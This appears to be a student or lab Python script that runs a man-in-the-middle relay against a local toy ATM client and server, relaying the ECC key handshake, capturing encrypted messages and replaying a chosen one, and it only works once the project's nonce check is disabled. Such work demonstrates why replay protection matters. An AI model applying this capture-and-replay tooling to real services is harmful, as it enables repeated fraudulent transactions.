# This code is a replay attack that can play the same attack the user did on the server.
# This code only works if we ignore the nonce. 

# You would need to comment out this line in tunnel.py line 83 to make it work:
# if nonce_num != expected_nonce:
    # return (None, None)

# How to run:
# 1. Run this file in a terminal: python mitm_replay_tool.py
# 2. Run the client.py in another terminal: python client.py
# 3. Do the actions you want to replay in the client.py terminal.
# 4. Press 'r' in the mitm_replay_tool.py terminal to choose the action you want to replay. (Replay C→S messages)

import socket
import threading
import time
import server

LISTEN_HOST = '127.0.0.1'
LISTEN_PORT = 8000

captured_messages = []
message_labels = []
client_socket = None
proxy_server_socket = None

def forward_and_capture(source, destination, label):
    try:
        while True:
            data = source.recv(1024)
            if not data:
                break
            print(f"[{label}] Received {len(data)} bytes: {data.hex()[:64]}...")
            if len(data) >= 80:
                label_text = f"msg#{len(captured_messages)+1} len={len(data)} from {label}"
                print(f"[{label}] Captured message: {label_text}")
                captured_messages.append(data)
                message_labels.append(label_text)
            destination.sendall(data)
    except Exception as e:
        print(f"[{label}] Connection closed: {e}")

def replay_message():
    global proxy_server_socket
    if not captured_messages:
        print("[REPLAY] No captured messages to replay.")
        return

    print("\n[REPLAY] Available captured messages:")
    for i, label in enumerate(message_labels):
        print(f"[{i}] {label}")

    try:
        index = int(input("Select message index to replay: ").strip())
        if index < 0 or index >= len(captured_messages):
            print("[REPLAY] Invalid index.")
            return
        msg = captured_messages[index]
        print(f"[REPLAY] Replaying: {msg.hex()}")
        proxy_server_socket.send(msg)
    except Exception as e:
        print(f"[REPLAY] Failed: {e}")

# MITM Relay Setup (With internal server launch)
def start_mitm_proxy():
    global client_socket, proxy_server_socket

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((LISTEN_HOST, LISTEN_PORT))
    listener.listen(1)
    print(f"[MITM] Listening on {LISTEN_HOST}:{LISTEN_PORT}...")

    client_socket, client_addr = listener.accept()
    print(f"[MITM] Client connected from {client_addr}")

    # Create socket pair to talk to internal server
    proxy_server_socket, internal_socket = socket.socketpair()

    # Override server socket.accept to return our socket pair
    original_accept = socket.socket.accept
    def fake_accept(sock):
        return internal_socket, ('127.0.0.1', 12345)
    socket.socket.accept = lambda self: fake_accept(self)

    # Manually create ATM instance so server.run_server() works
    server.atm = server.ATM()

    # Start server inside this proxy
    server_thread = threading.Thread(target=server.run_server, daemon=True)
    server_thread.start()
    time.sleep(1)  # let server initialize

    socket.socket.accept = original_accept  # restore original

    # ECC handshake relay
    client_pub_msg = client_socket.recv(1024)
    print(f"[MITM] Intercepted client public key: {client_pub_msg.decode(errors='ignore')}")
    proxy_server_socket.send(client_pub_msg)

    server_pub_msg = proxy_server_socket.recv(1024)
    print(f"[MITM] Intercepted server public key: {server_pub_msg.decode(errors='ignore')}")
    client_socket.send(server_pub_msg)

    # Launch bidirectional traffic forwarding
    t1 = threading.Thread(target=forward_and_capture, args=(client_socket, proxy_server_socket, 'C→S'))
    t2 = threading.Thread(target=forward_and_capture, args=(proxy_server_socket, client_socket, 'S→C'))
    t1.start()
    t2.start()

    def interface():
        while True:
            print("\n[MITM] Commands: (r) replay, (q) quit")
            cmd = input("→ ").strip().lower()
            if cmd == 'r':
                replay_message()
            elif cmd == 'q':
                try:
                    client_socket.close()
                    proxy_server_socket.close()
                except:
                    pass
                break

    interface_thread = threading.Thread(target=interface)
    interface_thread.start()

    t1.join()
    t2.join()
    interface_thread.join()

if __name__ == '__main__':
    start_mitm_proxy()
